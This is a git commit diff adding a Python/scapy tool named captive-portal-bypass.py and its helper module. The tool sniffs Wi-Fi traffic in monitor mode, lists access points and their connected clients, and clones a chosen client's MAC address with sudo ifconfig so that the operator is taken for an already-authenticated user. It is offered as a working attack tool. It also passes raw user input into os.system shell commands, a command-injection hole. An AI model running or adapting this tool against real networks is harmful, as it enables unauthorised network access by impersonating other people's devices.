384b7a307943e734be7fd667373f5ec4372838e2
Rohan van Klinken <rohanarievk@gmail.com>
2018-11-30 17:14:45 +1000

    started centralising code to helper file

---
+++ captive-portal-bypass.py
@@ -0,0 +1,66 @@
+# implement with sets instead of lists
+from scapy.all import *
+from helper import *
+
+found = {}
+host_list = []
+aps = []
+selected = []
+clients = set()
+
+if len(sys.argv) < 2:
+  print("usage: deauth.py <iface>")
+  sys.exit(-1)
+conf.iface = sys.argv[1]
+
+os.system("clear")
+
+manual = input("0 : scan for target APs \n1 : manual target AP entry\nchoice : ")
+while manual != "0" and manual != "1":
+  manual = input("Invalid choice\nchoice : ")
+
+select_channel(conf.iface)
+
+# Get AP address(es)
+if manual == "0":
+  data = discover_aps(conf.iface)
+  aps = data["aps"]
+  host_list = data["host_list"]
+
+if manual == "1":
+  # TODO: Add option to input multiple mac addresses
+  entered = input("target AP MAC address (use commas to seperate multiple) : ").replace(" ", "").split(",")
+  for i in range(len(entered)):
+    host_list.append([1, {"cli": entered[i]}])
+  aps = range(len(entered))
+  # TODO: Check if mac address is valid
+
+selected = [host_list[n][0].lower() for n in aps]
+
+print("searching for target clients")
+search = True
+while search:
+  clients = discover_clients(conf.iface, selected, 100)["found_clients"]
+  if not len(clients) is 0:
+    search = False
+
+clients = list(clients)
+
+for i in range(len(clients)):
+  print(str(i) + " : " + clients[i])
+
+valid = False
+while not valid:
+  target_client = input("target client: ")
+  if target_client.isdigit():
+    if int(target_client) < len(clients):
+      valid = True
+target_client = clients[int(target_client)]
+print(target_client)
+
+# Spoofing MAC address
+spoof_mac(conf.iface, target_client)
+
+# TODO: Add code to put card back into managed mode on Linux
+if sys.platform.startswith('darwin'):
+  os.system("killall airport")
---
+++ helper.py
@@ -0,0 +1,95 @@
+from scapy.all import *
+import os
+import sys
+
+found_aps = {}
+found_clients = set()
+selected_aps = []
+
+def select_channel(iface):
+  channel = ""
+  while channel.isdigit() != True:
+    channel = input("channel to use : ")
+
+  if sys.platform.startswith('darwin'):
+    os.system("nohup /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport " + iface + " sniff " + channel + " |tee &")
+    time.sleep(0.5)
+
+  if sys.platform.startswith('linux'):
+    os.system("iwconfig " + conf.iface + " channel " + channel)
+
+  return channel
+
+def spoof_mac(iface, mac):
+  cmd = "sudo ifconfig " + iface + " ether " + mac
+  print("executing sudo command : " + cmd)
+  os.system(cmd)
+  print("mac address changed")
+
+def sniff_aps(p):
+  global found_aps
+  stamgmtstypes = (0, 2, 4)
+  if p.haslayer(Dot11) and p.type == 0 and p.subtype == 0x08 and hasattr(p, 'info'):
+    ssid = ( len(p.info) > 0 and p.info != "\x00" ) and p.info or '<hidden>'
+    probe = { "ssid": ssid, "cli": p.addr2 }
+    key = "%s" % (p.addr2)
+    found_aps[key] = probe
+
+def sniff_clients(p):
+  global found_clients
+  if p.haslayer(Dot11):
+    if p.addr1 and p.addr2:
+      packet_ap = p.addr1.lower()
+      packet_client = p.addr2.lower()
+      if packet_ap in selected_aps:
+        found_clients.add(packet_client)
+
+def discover_aps(iface):
+  global found_aps
+  host_list = []
+  aps = []
+
+  # Capture n number of packets and use them to generate a list of available APs, their mac addresses and their SSIDs
+  n = ""
+  while n.isdigit() != True:
+    n = input("number of packets to capture : ")
+  n = int(n)
+
+  sniff(iface=iface, prn=sniff_aps, monitor=True, count=n)
+
+  # Make an array version of found_aps so that each AP has a number associated with it for the user to choose
+  for key,probe in found_aps.items():
+    item = [key,probe]
+    host_list.append(item)
+
+  # Print out the list of discovered APs and their index so that the user can choose one
+  for i in range(len(host_list)):
+    item = host_list[i]
+    print(str(i) + " : " + str(item[1]["ssid"])[2:-1] + " : " + item[1]["cli"])
+
+  # Get & process user input
+  n = ""
+  while n.replace(",", "").isdigit() != True:
+    n = input("target AP (r - rescan, q - quit, use commas to seperate multiple APs) : ")
+    if n == "r":
+      return discover_aps(iface)
+    elif n == "q":
+      sys.exit()
+
+  aps = list(map(int, n.replace(" ", "").split(",")))
+
+  response = {
+    "aps": aps,
+    "host_list": host_list
+  }
+  return response
+
+def discover_clients(iface, aps, count):
+  global found_clients
+  global selected_aps
+  selected_aps = aps
+  sniff(iface=iface, prn=sniff_clients, monitor=True, count=count)
+  response = {
+    "found_clients": found_clients
+  }
+  return response
